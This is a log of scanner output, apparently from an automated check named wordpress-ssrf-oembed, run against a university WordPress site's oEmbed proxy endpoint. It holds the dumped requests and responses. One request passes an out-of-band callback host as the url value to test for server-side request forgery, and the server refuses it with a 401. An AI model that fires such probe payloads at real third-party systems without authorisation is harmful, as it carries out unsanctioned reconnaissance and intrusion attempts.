@@ -1,0 +1,54 @@
+[wordpress-ssrf-oembed] Dumped HTTP request for https://particletheory.science.unimelb.edu.au/wp-json/oembed/1.0/proxy
+
+
+GET /wp-json/oembed/1.0/proxy HTTP/1.1
+Host: particletheory.science.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept-Encoding: gzip
+
+
+[wordpress-ssrf-oembed] Dumped HTTP response https://particletheory.science.unimelb.edu.au/wp-json/oembed/1.0/proxy
+
+HTTP/1.1 400 Bad Request
+Connection: close
+Transfer-Encoding: chunked
+Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
+Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link
+Content-Type: application/json; charset=UTF-8
+Date: Wed, 06 Aug 2025 15:18:11 GMT
+Link: <https://particletheory.science.unimelb.edu.au/wp-json/>; rel="https://api.w.org/"
+Server: openresty
+Vary: Cookie
+Vary: Origin
+X-Content-Type-Options: nosniff
+X-Robots-Tag: noindex
+
+{"code":"rest_missing_callback_param","message":"Missing parameter(s): url","data":{"status":400,"params":["url"]}}
+[wordpress-ssrf-oembed] Dumped HTTP request for https://particletheory.science.unimelb.edu.au/wp-json/oembed/1.0/proxy?url=http://d29n3paus8n0ghhurvjgigkywk4ish5df.oast.me
+
+
+GET /wp-json/oembed/1.0/proxy?url=http://d29n3paus8n0ghhurvjgigkywk4ish5df.oast.me HTTP/1.1
+Host: particletheory.science.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept-Encoding: gzip
+
+
+[wordpress-ssrf-oembed] Dumped HTTP response https://particletheory.science.unimelb.edu.au/wp-json/oembed/1.0/proxy?url=http://d29n3paus8n0ghhurvjgigkywk4ish5df.oast.me
+
+HTTP/1.1 401 Unauthorized
+Connection: close
+Transfer-Encoding: chunked
+Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
+Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link
+Content-Type: application/json; charset=UTF-8
+Date: Wed, 06 Aug 2025 15:18:12 GMT
+Link: <https://particletheory.science.unimelb.edu.au/wp-json/>; rel="https://api.w.org/"
+Server: openresty
+Vary: Cookie
+Vary: Origin
+X-Content-Type-Options: nosniff
+X-Robots-Tag: noindex
+
+{"code":"rest_forbidden","message":"Sorry, you are not allowed to make proxied oEmbed requests.","data":{"status":401}}
